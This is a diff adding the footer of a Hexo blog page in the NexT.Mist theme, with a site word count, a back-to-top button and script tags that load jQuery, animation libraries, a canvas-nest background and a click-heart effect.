+  <!-- <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div> 
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>-->
+
+
+
+<div class="theme-info">
+ <div class="powered-by"></div>
+ <span class="post-count">博客全站共69.1k字</span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
